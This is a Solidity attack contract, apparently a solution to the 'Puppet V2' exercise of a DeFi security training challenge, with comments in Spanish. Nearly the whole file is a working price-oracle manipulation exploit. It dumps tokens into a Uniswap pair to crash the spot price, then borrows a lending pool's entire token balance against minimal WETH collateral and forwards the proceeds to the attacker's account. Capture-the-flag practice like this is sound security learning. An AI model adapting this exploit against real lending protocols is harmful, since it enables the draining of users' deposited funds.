// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "hardhat/console.sol";
import "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";

interface IPuppetV2Pool {
  function calculateDepositOfWETHRequired(uint256 amount) external view returns (uint256);
  function borrow(uint256 borrowAmount) external;
}

interface IERC20 {
  function approve(address spender, uint256 amount) external returns (bool);
  function balanceOf(address account) external returns (uint256);
  function transfer(address to, uint256 amount) external returns (bool);
  function transferFrom(address from, address to, uint256 amount) external returns (bool);
  function deposit() external payable;
}

//Interfaz de Uniswap tomada a partir de UniswapV1Exchange.json
interface IUniswapRouter { 
  function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
  function WETH() external pure returns (address);
}

contract PuppetV2Attacker {

  IERC20 public _token;
  IERC20 public _weth;
  IUniswapRouter public _uniswapRouter;
  IPuppetV2Pool public _puppetV2Pool;

  constructor(IERC20 token, IERC20 wethAddress, IUniswapRouter uniswapRouter, IPuppetV2Pool puppetV2Pool) public{
    _token = token;
    _weth = wethAddress;
    _uniswapRouter = uniswapRouter;
    _puppetV2Pool = puppetV2Pool;
  }

  function verOrden() public returns (address token0, address token1) {
    (token0, token1) = UniswapV2Library.sortTokens(address(_token), address(_weth));
    console.log(token0);
    console.log(token1);
  }

  function attack() public {

    // Permitimos a uniswapRouter utilizar todos nuestos DVTs y puppetPoolV2 nuestros WETH. Manipulamos el balance en uniswapPair para que el método de puppetV2Pool "_computeOraclePrice" rompa con la lógica de "1 DVT = 3 WETH".
    address[] memory swapPath = new address[](2);
    swapPath[0] = address(_token);
    swapPath[1] = address(_uniswapRouter.WETH());

    _token.approve(address(_uniswapRouter), _token.balanceOf(address(this)));
    _uniswapRouter.swapExactTokensForETH(_token.balanceOf(address(this)), 0, swapPath, address(this), 9999999999);
    
    //Calculamos el depósito necesario en ETH
    uint256 depositoNecesario = _puppetV2Pool.calculateDepositOfWETHRequired(_token.balanceOf(address(_puppetV2Pool)));
    // console.log("DEPOSITO NECESARIO:");
    // console.log(depositoNecesario);

    //Aumentamos el denominador de la ecuación para hacerla tender al menor valor posible. Exactamente igual que en puppet v1 pero esta vez con el contrato WETH.
    _weth.deposit{value: depositoNecesario}();
    _weth.approve(address(_puppetV2Pool), depositoNecesario);

    // Realizamos el borrow al contrato puppet para pedir prestado por siempre todos sus DVT :)
    _puppetV2Pool.borrow(_token.balanceOf(address(_puppetV2Pool)));
    // console.log("SE HIZO EL BORROW");
    
    //Transferimos todos los DVT obtenidos a la EOA attacker.
    _token.transfer(msg.sender,_token.balanceOf(address(this)));
    // console.log("SE MANDARON LOS DVT DE NUEVO AL ATTACKER");

    //Transferimos el ETH que sobró a la EOA attacker.
    payable(msg.sender).transfer(address(this).balance);
  }

    //Para poder recibir los ETH y atacar
    receive() external payable {}
}